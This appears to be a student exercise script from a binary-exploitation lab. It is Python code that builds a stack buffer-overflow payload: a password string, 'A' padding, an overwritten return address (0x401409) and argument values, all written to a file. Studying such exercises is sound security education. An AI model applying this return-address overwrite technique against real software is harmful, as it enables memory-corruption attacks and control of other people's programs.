import struct

# Convert integer to byte array (integer little endian).
def dw(i):
    return struct.pack("<I",i)

# TODO 1: Fill this with offset to return address location.
offset = 13

payload = ''
payload += "NOP000" 
payload += "IDA_1z_y0ur_fr1end"
payload += "\n"
# Add a number of 'offset' A characters to the payload.
#payload +="b" * offset# Add a number of 'offset' A characters to the payload.
payload +="A" * offset

payload +=dw(193)

payload +="A" * (offset-1)
payload +=dw(0x401409) 
payload +=dw(0)
payload +=dw(193)
payload +=dw(200)
payload +=dw(198)
payload +=dw(194)

# TODO: Add more to the payload such as the value overwriting the return address.
# Use dw() function.

with open('payload_b', 'wb') as f:
    f.write(payload)
